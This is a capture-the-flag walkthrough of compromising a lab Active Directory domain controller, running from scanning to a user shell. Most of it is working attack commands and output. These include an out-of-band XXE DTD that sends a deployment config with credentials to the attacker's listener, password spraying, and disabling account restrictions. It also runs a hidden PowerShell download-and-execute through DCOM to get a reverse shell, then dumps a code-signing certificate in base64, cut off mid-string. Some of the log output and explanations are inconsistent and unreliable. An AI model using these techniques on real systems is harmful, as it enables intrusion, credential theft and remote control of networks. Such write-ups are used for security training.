
Target : 10.129.68.148

Date : 11/09/2026

```bash
> �nmap -sC -sV -O -Pn --min-rate=3000 -T4 10.129.68.148  
Please touch the FIDO authenticator.  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-11 18:14 +0200  
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan  
NSE Timing: About 0.00% done  
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan  
NSE Timing: About 98.27% done; ETC: 18:15 (0:00:00 remaining)  
Nmap scan report for 10.129.68.148  
Host is up (0.049s latency).  
Not shown: 986 closed tcp ports (reset)  
PORT ����STATE SERVICE ������VERSION  
53/tcp ��open �domain �������Simple DNS Plus  
80/tcp ��open �http ���������Microsoft IIS httpd 10.0  
| http-methods: �  
|_ �Potentially risky methods: TRACE  
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.  
|_http-server-header: Microsoft-IIS/10.0  
| http-auth: �  
| HTTP/1.1 401 Unauthorized\x0D  
|_ �Server returned status 401 but no WWW-Authenticate header.  
88/tcp ��open �kerberos-sec �Microsoft Windows Kerberos (server time: 2026-09-11 23:14:46Z)  
135/tcp �open �msrpc ��������Microsoft Windows RPC  
139/tcp �open �netbios-ssn ��Microsoft Windows netbios-ssn  
389/tcp �open �ldap ���������Microsoft Windows Active Directory LDAP (Domain: scaffold.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-09-11T23:15:48+00:00; +7h00m01s from scanner time.  
| ssl-cert: Subject: �  
| Subject Alternative Name: DNS:dc.scaffold.htb, DNS:scaffold.htb, DNS:SCAFFOLD  
| Not valid before: 2026-09-01T23:51:52  
|_Not valid after: �2106-09-01T23:51:52  
443/tcp �open �ssl/https?  
| ssl-cert: Subject: commonName=portal.scaffold.htb  
| Subject Alternative Name: DNS:portal.scaffold.htb, DNS:DC01  
| Not valid before: 2026-05-23T12:31:56  
|_Not valid after: �2029-05-23T12:41:56  
|_ssl-date: TLS randomness does not represent time  
| tls-alpn: �  
| ��h2  
|_ �http/1.1  
445/tcp �open �microsoft-ds?  
464/tcp �open �kpasswd5?  
593/tcp �open �ncacn_http ���Microsoft Windows RPC over HTTP 1.0  
636/tcp �open �ssl/ldap �����Microsoft Windows Active Directory LDAP (Domain: scaffold.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: �  
| Subject Alternative Name: DNS:dc.scaffold.htb, DNS:scaffold.htb, DNS:SCAFFOLD  
| Not valid before: 2026-09-01T23:51:52  
|_Not valid after: �2106-09-01T23:51:52  
|_ssl-date: 2026-09-11T23:15:49+00:00; +7h00m01s from scanner time.  
3268/tcp open �ldap ���������Microsoft Windows Active Directory LDAP (Domain: scaffold.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: �  
| Subject Alternative Name: DNS:dc.scaffold.htb, DNS:scaffold.htb, DNS:SCAFFOLD  
| Not valid before: 2026-09-01T23:51:52  
|_Not valid after: �2106-09-01T23:51:52  
|_ssl-date: 2026-09-11T23:15:49+00:00; +7h00m01s from scanner time.  
3269/tcp open �ssl/ldap �����Microsoft Windows Active Directory LDAP (Domain: scaffold.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: �  
| Subject Alternative Name: DNS:dc.scaffold.htb, DNS:scaffold.htb, DNS:SCAFFOLD  
| Not valid before: 2026-09-01T23:51:52  
|_Not valid after: �2106-09-01T23:51:52  
|_ssl-date: 2026-09-11T23:15:48+00:00; +7h00m00s from scanner time.  
5985/tcp open �http ���������Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.99%E=4%D=9/11%OT=53%CT=1%CU=40508%PV=Y%DS=2%DC=I%G=Y%TM=6AA4293  
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=  
OS:A)SEQ(SP=105%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=107%GCD=2%ISR  
OS:=10A%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FA%GCD=1%ISR=110%TI=I%CI=I%II=I%SS=  
OS:S%TS=A)SEQ(SP=FC%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M552NW8ST  
OS:11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552S  
OS:T11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=8  
OS:0%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(  
OS:R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%  
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=  
OS:)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)  
OS:IE(R=Y%DFI=N%T=80%CD=Z)  
  
Network Distance: 2 hops  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time: �  
| ��date: 2026-09-11T23:15:42  
|_ �start_date: N/A  
| smb2-security-mode: �  
| ��3.1.1: �  
|_ ���Message signing enabled and required  
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 70.07 seconds
```

`MITRE ID : Active Scanning - Vulnerability Scanning T1595.002`
`MITRE ID : Network Service Discovery T1046`

The host script reports `clock-skew: mean: 7h00m00s` against `kerberos-sec` server time. We note that offset early because Kerberos on our attack box will fail with `KRB_AP_ERR_SKEW` until we align to the DC.

We've got `DNS:dc.scaffold.htb, DNS:scaffold.htb` so we add them to hosts :

```bash
> �echo "10.129.68.148 dc.scaffold.htb scaffold.htb" | sudo tee -a /etc/hosts  
10.129.68.148 dc.scaffold.htb scaffold.htb
```

The `443/tcp` cert also names `portal.scaffold.htb`. The MSI deployment portal later binds to `https://dc.scaffold.htb/` with Kerberos, so we keep the DC FQDN in `hosts` rather than hitting the raw IP.

Main open ports that indicate this is an Active Directory are `88/tcp kerberos - 443/tcp SMB` as well as `LDAP 3268/tcp & 389/tcp` with also `53/tcp DNS & 80/tcp http`

We've got these credentials : `As in common in real life pentests, you will start the Scaffold box with credentials for the following account: j.harris / Harr1sHelpdesk2026!Breach` which we can use `bloodhound-python` to get a `.zip Bloodhound graph` we can then import to `Bloodhound-CE`.

```bash
> �bloodhound-python -u 'j.harris' -p 'Harr1sHelpdesk2026!Breach' -d scaffold.htb -ns 10.129.68.148 -c All --zip  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: scaffold.htb  
INFO: Getting TGT for user  
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  
INFO: Connecting to LDAP server: dc.scaffold.htb  
INFO: Testing resolved hostname connectivity dead:beef::394f:f4bf:2992:bf4b  
INFO: Trying LDAP connection to dead:beef::394f:f4bf:2992:bf4b  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc.scaffold.htb  
INFO: Testing resolved hostname connectivity dead:beef::394f:f4bf:2992:bf4b  
INFO: Trying LDAP connection to dead:beef::394f:f4bf:2992:bf4b  
INFO: Found 16 users  
INFO: Found 62 groups  
INFO: Found 3 gpos  
INFO: Found 2 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc.scaffold.htb  
INFO: Done in 00M 33S  
INFO: Compressing output into 20260911183421_bloodhound.zip
```

`MITRE ID : Valid Accounts T1078`
`MITRE ID : Account Discovery T1087`

When Kerberos fails with skew we sync to the DC before any ticket work:

```bash
> sudo ntpdate -u 10.129.68.148
```

`j.harris` has no `Outbound Control` and is the member of `HELPDESK@SCAFFOLD.HTB - USERS@SCAFFOLD.HTB - DOMAIN USERS@SCAFFOLD.HTB`

We need to search elsewhere.

`MITRE ID : Network Service Discovery T1046`

```bash
> �rustscan -a 10.129.68.148 --ulimit 5000 -- -sC -sV
```

Gives us :

```
9800/tcp �open �http ���������syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Service Unavailable  
9801/tcp �open �http ���������syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Service Unavailable
```

These ports correspond to `MDT (Microsoft Deployment Toolkit)` for deployment which can write `XML` into `Settings` in the `Computers` row :

`MITRE ID : Exploit Public-Facing Application T1190`

`9800/tcp` is the unauthenticated `MDTMonitorEvent` WCF service. `9801/tcp` is the OData `MDTMonitorData` API. `PostEvent` registers a fake deployment row; `MERGE` on `Computers(<ID>)` writes into `Settings`; `GetSettings` on `9800` parses that XML server-side.

We stage the out-of-band `XXE : XML External Entity` DTD and a listener on the port we advertise in `dartPort`:

```bash
> cd ~/scaffold-mdt
> cat > evil.dtd <<'EOF'
<!ENTITY % file SYSTEM "file:///Y:/DeploymentShare/Control/CustomSettings.ini">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.15.133:9100/?data=%file;'>">
%eval;
%exfil;
EOF

> python3 -m http.server 9100 > /tmp/mdt-listener.log 2>&1 &
```

After `PostEvent` returns the `UniqueID`, we inject the malicious `Settings` blob with `MERGE` (replace `<ID>` with the numeric OData key from `/Computers`):

```bash
> curl -sS -X MERGE "http://${TARGET}:9801/MDTMonitorData/Computers(41)" \
  -H 'Content-Type: application/json; charset=utf-8' \
  -H 'DataServiceVersion: 1.0' \
  -d '{"Settings":"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE Settings SYSTEM \"http://10.10.15.133:9100/evil.dtd\">\n<Settings><MonitorResult>xxe</MonitorResult></Settings>"}'

> curl -sS "http://${TARGET}:9800/MDTMonitorEvent/GetSettings?uniqueID=${GUID}"
```

`MITRE ID : Unsecured Credentials T1552`

```bash
> �curl -sS -H 'Accept: application/json' \  
�http://10.129.68.148:9801/MDTMonitorData/Computers  
{  
"d" : [  
  
]  
}% ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������  
> �curl -sS http://10.129.68.148:9801/MDTMonitorData/\$metadata | rg -i 'Settings|Computer|Writable'  
  
�����<EntityType Name="Computer">  
�������<Property Name="Settings" Type="Edm.String" Nullable="true" MaxLength="4000" Unicode="true" FixedLength="false" />  
�������<NavigationProperty Name="ComputerIdentities" Relationship="MDT_MonitorModel.ComputerToIdentity" FromRole="Computer" ToRole="ComputerIdentity" />  
�����<EntityType Name="ComputerIdentity">  
�������<NavigationProperty Name="Computer" Relationship="MDT_MonitorModel.ComputerToIdentity" FromRole="ComputerIdentity" ToRole="Computer" />  
�����<Association Name="ComputerToIdentity">  
�������<End Role="Computer" Type="MDT_MonitorModel.Computer" Multiplicity="1" />  
�������<End Role="ComputerIdentity" Type="MDT_MonitorModel.ComputerIdentity" Multiplicity="*" />  
���������<Principal Role="Computer">  
���������<Dependent Role="ComputerIdentity">  
�������<EntitySet Name="Computers" EntityType="MDT_MonitorModel.Computer" />  
�������<EntitySet Name="ComputerIdentities" EntityType="MDT_MonitorModel.ComputerIdentity" />  
�������<AssociationSet Name="ComputerToIdentity" Association="MDT_MonitorModel.ComputerToIdentity">  
���������<End Role="Computer" EntitySet="Computers" />  
���������<End Role="ComputerIdentity" EntitySet="ComputerIdentities" />
```

We'll create a workspace to deploy our malicious deployment :

```bash
> �mkdir -p ~/scaffold-mdt && cd ~/scaffold-mdt  
export ATTACKER=10.10.15.133  
export TARGET=10.129.68.148
> �export GUID=$(python3 -c "import uuid; print(uuid.uuid4())")  
echo "GUID=$GUID"  
  
curl -sS "http://${TARGET}:9800/MDTMonitorEvent/PostEvent?uniqueID=${GUID}&computerName=POC&messageID=41000&severity=1&stepName=Initial&currentStep=1&totalSteps=1&id=${GUID}&message=register&dartIP=${ATTACKER}&  
dartPort=9100&dartTicket=x&vmHost=x&vmName=x"  
GUID=639bfaa5-4d04-4059-b895-aa69f782ea05  
<string xmlns="http://schemas.microsoft.com/2003/10/Serialization/">324be39c-9b27-4df0-b050-2b8b67a24bc9</string>%
> �curl -sS -H 'Accept: application/json' \  
�"http://${TARGET}:9801/MDTMonitorData/Computers" | python3 -m json.tool  
{  
���"d": [  
�������{  
�����������"__metadata": {  
���������������"uri": "http://10.129.68.148:9801/MDTMonitorData/Computers(40)",  
���������������"type": "MDT_MonitorModel.Computer"  
�����������},  
�����������"Name": "POC",  
�����������"PercentComplete": 100,  
�����������"Settings": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE Settings SYSTEM \"http://10.10.15.133:9100/evil.dtd\">\n<Settings><MonitorResult>xxe</MonitorResult></Settings>",  
�����������"Warnings": 0,  
�����������"Errors": 0,  
�����������"DeploymentStatus": 1,  
�����������"StartTime": "/Date(1789171798167)/",  
�����������"EndTime": null,  
�����������"ID": 40,  
�����������"UniqueID": "087ec2d2-7573-43ec-b1a0-8d225ff1b549",  
�����������"CurrentStep": 1,  
�����������"TotalSteps": 1,  
�����������"StepName": "Initial",  
�����������"LastTime": "/Date(1789171798230)/",  
�����������"DartIP": "10.10.15.133",  
�����������"DartPort": "9100",  
�����������"DartTicket": "x",  
�����������"VMHost": "x",  
�����������"VMName": "x",  
�����������"ComputerIdentities": {  
���������������"__deferred": {  
�������������������"uri": "http://10.129.68.148:9801/MDTMonitorData/Computers(40)/ComputerIdentities"  
���������������}  
�����������}  
�������},  
�������{  
�����������"__metadata": {  
���������������"uri": "http://10.129.68.148:9801/MDTMonitorData/Computers(41)",  
���������������"type": "MDT_MonitorModel.Computer"  
�����������},  
�����������"Name": "POC",  
�����������"PercentComplete": 100,  
�����������"Settings": null,  
�����������"Warnings": 0,  
�����������"Errors": 0,  
�����������"DeploymentStatus": 1,  
�����������"StartTime": "/Date(1789171816370)/",  
�����������"EndTime": null,  
�����������"ID": 41,  
�����������"UniqueID": "324be39c-9b27-4df0-b050-2b8b67a24bc9",  
�����������"CurrentStep": 1,  
�����������"TotalSteps": 1,  
�����������"StepName": "Initial",  
�����������"LastTime": "/Date(1789171816370)/",  
�����������"DartIP": "10.10.15.133",  
�����������"DartPort": "9100",  
�����������"DartTicket": "x",  
�����������"VMHost": "x",  
�����������"VMName": "x",  
�����������"ComputerIdentities": {  
���������������"__deferred": {  
�������������������"uri": "http://10.129.68.148:9801/MDTMonitorData/Computers(41)/ComputerIdentities"  
���������������}  
�����������}  
�������}  
���]  
}
```

```bash
> �cat /tmp/mdt-listener.log | tail -20  
  
10.129.68.148 - - [11/Sep/2026 19:10:17] "GET /evil.dtd HTTP/1.1" 200 -  
10.129.68.148 - - [11/Sep/2026 19:10:17] "GET /?data=%5BSettings%5D%0D%0APriority=Default%0D%0AProperties=MyCustomProperty%0D%0A%0D%0A%5BDefault%5D%0D%0AOSInstall=Y%0D%0A%0D%0A%0D%0ADeployRoot=%5C%5CDC%5CDeploy  
mentShare$%0D%0AUserID=svc_deploy%0D%0AUserPassword=[REDACTED]%0D%0AUserDomain=scaffold.htb%0D%0A%0D%0A%0D%0AJoinDomain=scaffold.htb%0D%0ADomainAdmin=svc_deploy%0D%0ADomainAdminPassword=[REDACTED]%0D%0AMachineObjectOU=OU=Workstations,OU=Computers,DC=scaffold,DC=htb%0D%0A%0D%0A%0D%0ASkipCapture=NO%0D%0ASkipAdminPassword=YES%0D%0ASkipProductKey=YES%0D%0ASkipComputerBackup=NO%0D%0ASkipBitLocker=NO%  
0D%0ASkipLocaleSelection=YES%0D%0ASkipTimeZone=YES%0D%0ASkipUserData=YES%0D%0ASkipComputerName=NO%0D%0ASkipDomainMembership=NO%0D%0A%0D%0A%0D%0AKeyboardLocale=en-US%0D%0AUserLocale=en-US%0D%0AUILanguage=en-US%0  
D%0AHideShell=YES%0D%0AApplyGPOPack=YES%0D%0AEventService=http://dc:9800 HTTP/1.1" 200 -
```

We decode it :

```bash
> �rg -o 'data=[^ ]+' /tmp/mdt-listener.log | tail -1 | cut -d= -f2- | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"  
[Settings]  
Priority=Default  
Properties=MyCustomProperty  
  
[Default]  
OSInstall=Y  
  
  
DeployRoot=\\DC\DeploymentShare$  
UserID=svc_deploy  
UserPassword=[REDACTED]  
UserDomain=scaffold.htb  
  
  
JoinDomain=scaffold.htb  
DomainAdmin=svc_deploy  
DomainAdminPassword=[REDACTED]  
MachineObjectOU=OU=Workstations,OU=Computers,DC=scaffold,DC=htb  
  
  
SkipCapture=NO  
SkipAdminPassword=YES  
SkipProductKey=YES  
SkipComputerBackup=NO  
SkipBitLocker=NO  
SkipLocaleSelection=YES  
SkipTimeZone=YES  
SkipUserData=YES  
SkipComputerName=NO  
SkipDomainMembership=NO  
  
  
KeyboardLocale=en-US  
UserLocale=en-US  
UILanguage=en-US  
HideShell=YES  
ApplyGPOPack=YES  
EventService=http://dc:9800
```

And we got `svc_deploy:[REDACTED]` which we'll use with `bloodyAD` :

`MITRE ID : OS Credential Dumping T1003`

```bash
> �/usr/bin/bloodyad --host dc.scaffold.htb -d scaffold.htb -u svc_deploy -p '[REDACTED]' get writable  
  
  
  
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scaffold,DC=htb  
permission: WRITE  
  
distinguishedName: CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb  
permission: WRITE  
  
distinguishedName: CN=svc_deploy,OU=Users,OU=Scaffold,DC=scaffold,DC=htb  
permission: WRITE  
  
distinguishedName: CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb  
permission: WRITE  
  
distinguishedName: DC=_msdcs.scaffold.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=scaffold,DC=htb  
permission: CREATE_CHILD
```

We've got `WRITE` permission on `Users ; IT ; ForeignSecurityPrincipals and Quarantined_Accounts` as well as `Create Child` on `MicrosoftDNS`.

`MITRE ID : Domain or Tenant Policy Modification T1484`

We'll search who is in `Quarantined_Accounts` :

```bash
> �ldapsearch -x -H ldap://10.129.68.148 -D 'svc_deploy@scaffold.htb' -w '[REDACTED]' -b 'CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb' member 2>/dev/null  
# extended LDIF  
#  
# LDAPv3  
# base <CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb> with scope subtree  
# filter: (objectclass=*)  
# requesting: member �  
#  
  
# Quarantined_Accounts, Scaffold, scaffold.htb  
dn: CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb  
member: CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb  
  
# search result  
search: 2  
result: 0 Success  
  
# numResponses: 2  
# numEntries: 1
```

We've got `m.carter` as a `User` in `Quarantined_Accounts` which we'll inspect :

```bash
> �ldapsearch -x -H ldap://10.129.68.148 -D 'svc_deploy@scaffold.htb' -w '[REDACTED]' -b 'DC=scaffold,DC=htb' '(sAMAccountName=m.carter)' sAMAccountName userAccountControl description memberOf 2>/dev  
/null  
# extended LDIF  
#  
# LDAPv3  
# base <DC=scaffold,DC=htb> with scope subtree  
# filter: (sAMAccountName=m.carter)  
# requesting: sAMAccountName userAccountControl description memberOf �  
#  
  
# m.carter, Users, Scaffold, scaffold.htb  
dn: CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb  
description: Retained for endpoint migration validation. Temp reset: [REDACTED]  
memberOf: CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb  
memberOf: CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb  
userAccountControl: 66050  
sAMAccountName: m.carter  
  
# search reference  
ref: ldap://ForestDnsZones.scaffold.htb/DC=ForestDnsZones,DC=scaffold,DC=htb  
  
# search reference  
ref: ldap://DomainDnsZones.scaffold.htb/DC=DomainDnsZones,DC=scaffold,DC=htb  
  
# search reference  
ref: ldap://scaffold.htb/CN=Configuration,DC=scaffold,DC=htb  
  
# search result  
search: 2  
result: 0 Success  
  
# numResponses: 5  
# numEntries: 1
```

We'll spray the full `USERS` we found on `Bloodhound` with `svc_deploy`'s password :

```
- KRBTGT@SCAFFOLD.HTB
    
- T.WALKER@SCAFFOLD.HTB
    
- O.BENNETT@SCAFFOLD.HTB
    
- SVC_MDT@SCAFFOLD.HTB
    
- M.CARTER@SCAFFOLD.HTB
    
- SVC_DEPLOY@SCAFFOLD.HTB
    
- T.NGUYEN@SCAFFOLD.HTB
    
- D.COOPER@SCAFFOLD.HTB
    
- R.WILSON@SCAFFOLD.HTB
    
- K.PATEL@SCAFFOLD.HTB
    
- SVC_MDTMONITOR@SCAFFOLD.HTB
    
- ADMINISTRATOR@SCAFFOLD.HTB
    
- AUTHENTICATED USERS@SCAFFOLD.HTB
    
- DOMAIN USERS@SCAFFOLD.HTB
    
- INTERACTIVE@SCAFFOLD.HTB
    
- J.HARRIS@SCAFFOLD.HTB
    
- M.CHEN@SCAFFOLD.HTB
```

We create the user list to spray :

```bash
> �cat > spray-users.txt <<'EOF'  
t.walker  
o.bennett  
svc_mdt  
m.carter  
t.nguyen  
d.cooper  
r.wilson  
k.patel  
svc_mdtmonitor  
m.chen  
administrator  
EOF
```

Then we use `netexec` with `SMB` using `svc_deploy`'s password using the list to spray it :

```bash
> �nxc smb 10.129.68.148 -u spray-users.txt -p '[REDACTED]' -d scaffold.htb --continue-on-success  
  
SMB ��������10.129.68.148 ��445 ���DC ��������������[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:scaffold.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\t.walker:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\o.bennett:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\svc_mdt:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\m.carter:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\t.nguyen:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\d.cooper:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[+] scaffold.htb\r.wilson:[REDACTED] �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\k.patel:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\svc_mdtmonitor:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\m.chen:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\administrator:[REDACTED] STATUS_LOGON_FAILURE
```

We got `r.wilson:[REDACTED]`

`MITRE ID : Brute Force - Password Spraying T1110.003`

`r.wilson` has `AddSelf` to the `Helpdesk Operator` group on the Active Directory.

We also have `m.carter`'s credentials from the past search :

```bash
dn: CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb  
description: Retained for endpoint migration validation. Temp reset: [REDACTED]
```

But they are quarantined. As such we'll use `r.wilson`'s Outbound Control and verify he is in `Helpdesk operator` group :

```bash
CN=Helpdesk operator

OU=Helpdesk,OU=Scaffold,DC=scaffold,DC=htb

sAMAccountName: Helpdesk operator
```

```bash
> �ldapsearch -x -H ldap://10.129.68.148 -D 'r.wilson@scaffold.htb' -w '[REDACTED]' -b 'CN=Helpdesk operator,OU=Helpdesk,OU=Scaffold,DC=scaffold,DC=htb' member 2>/dev/null | rg -i wilson  
member: CN=r.wilson,OU=Users,OU=Scaffold,DC=scaffold,DC=htb
```

He's in.

We can see that `m.carter` is `DISABLED` :

```bash
> �nxc smb 10.129.68.148 -u m.carter -p '[REDACTED]' -d scaffold.htb  
  
SMB ��������10.129.68.148 ��445 ���DC ��������������[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:scaffold.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\m.carter:[REDACTED] STATUS_ACCOUNT_DISABLED 
```

We remove the quarantine `ACCOUNTDISABLE` from `m.carter` using this privilege :

```bash
> �/usr/bin/bloodyad --host dc.scaffold.htb -d scaffold.htb -u r.wilson -p '[REDACTED]' remove uac m.carter -f ACCOUNTDISABLE  
[+] ['ACCOUNTDISABLE'] property flags removed from m.carter's userAccountControl
```

`MITRE ID : Account Manipulation T1098`

We use `netexec SMB` with `m.carter` again :

```bash
> �nxc smb 10.129.68.148 -u m.carter -p '[REDACTED]' -d scaffold.htb  
  
SMB ��������10.129.68.148 ��445 ���DC ��������������[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:scaffold.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\m.carter:[REDACTED] STATUS_LOGON_TYPE_NOT_GRANTED
```

`STATUS_ACCOUNT_DISABLED` is now `STATUS_LOGON_TYPE_NOT_GRANTED`

We use `svc_deploy`'s `WRITE` rights to `set object` instead of `removing from group` :

```bash
> /usr/bin/bloodyad --host dc.scaffold.htb -d scaffold.htb \

-u svc_deploy -p '[REDACTED]' \

set object 'CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb' \

groupType 2
```

And we add him to `Endpoint Remote Management` :

```bash
/usr/bin/bloodyad --host dc.scaffold.htb -d scaffold.htb \

-u m.carter -p '[REDACTED]' \

add groupMember 'Endpoint Remote Management' m.carter
```

Flipping `groupType` to `2` turns `Quarantined_Accounts` from a distribution list into a security group so membership no longer blocks logon types the way the quarantine bit did.

`MITRE ID : Account Manipulation T1098`

```bash
> �nxc smb 10.129.68.148 -u m.carter -p '[REDACTED]' -d scaffold.htb  
  
SMB ��������10.129.68.148 ��445 ���DC ��������������[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:scaffold.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB ��������10.129.68.148 ��445 ���DC ��������������[+] scaffold.htb\m.carter:[REDACTED]
```

We host the callback script on `8080` and stage `r.ps1` before we trigger `dcomexec`:

```bash
> python3 -m http.server 8080 &
```

`MITRE ID : Command and Scripting Interpreter - PowerShell T1059.001`
`MITRE ID : Remote Services - Distributed Component Object Model T1021.003`

We open a listener :

```bash
> �nc -lvnp 4444  
Listening on 0.0.0.0 4444
```

Then we use a malicious `.ps1 (PowerShell)` :

```bash
> �ATTACKER=10.10.15.133  
/home/vagabond/.local/bin/dcomexec.py -silentcommand -nooutput -object MMC20 \  
�'scaffold.htb/m.carter:[REDACTED]@10.129.68.148' \  
�"cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://${ATTACKER}:8080/r.ps1')"
```

```bash
> �nc -lvnp 4444  
  
Listening on 0.0.0.0 4444  
10.10.15.133 - - [12/Sep/2026 03:49:15] "GET /r.ps1 HTTP/1.1" 200 -  
10.129.68.148 - - [12/Sep/2026 03:49:36] "GET /r.ps1 HTTP/1.1" 200 -  
Connection received on 10.129.68.148 53036  
type C:\Users\m.carter\Desktop\user.txt  
[REDACTED]
```

And we got the user flag.

```bash
PS C:\windows\system32> dir C:\Dev\DevCerts  
  
  
���Directory: C:\Dev\DevCerts  
  
  
Mode ����������������LastWriteTime ��������Length Name �����������������������������������������������������������������  
---- ����������������------------- ��������------ ---- �����������������������������������������������������������������  
-a---- ��������5/24/2026 ��3:34 PM ����������3200 InternalCodeSigning_01.pfx �������������������������������������������  
-a---- ��������5/24/2026 ��3:34 PM ����������3200 InternalCodeSigning_02.pfx
```

```bash
PS C:\windows\system32> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Dev\DevCerts\InternalCodeSigning_01.pfx"))  
MIIMfAIBAzCCDEIGCSqGSIb3DQEHAaCCDDMEggwvMIIMKzCCBtAGCSqGSIb3DQEHBqCCBsEwgga9AgEAMIIGtgYJKoZIhvcNAQcBMB0GCiqGSIb3DQEMAQMwDwQIWPEA1fAE4wkCAwDDUICCBohgr8Av1FbnaLXCXME2jomSF/6MDBpbTeBNsBEDIqF3XE1+7VXUbDrYCfYJbykI7q  
VcojBffGm1Ry1I8rQM6NI0Awk/E8lpG/7ZE2yJSSdZNdTwCQ2LewlRf3io9/MLz2xW4Aoz8Hp97ICTpoNThe+dlyQGjpYuAzf1cervgC8ZF9c/IYarlsT5celNjlp9DrLC9RlCEYd+ibypFo+V9+h+STztMiyHf99ZWSMh9yLJ3ANrRqkHYhYMDyI9mQBThRBRR4LdhsgzERPuJqh/  
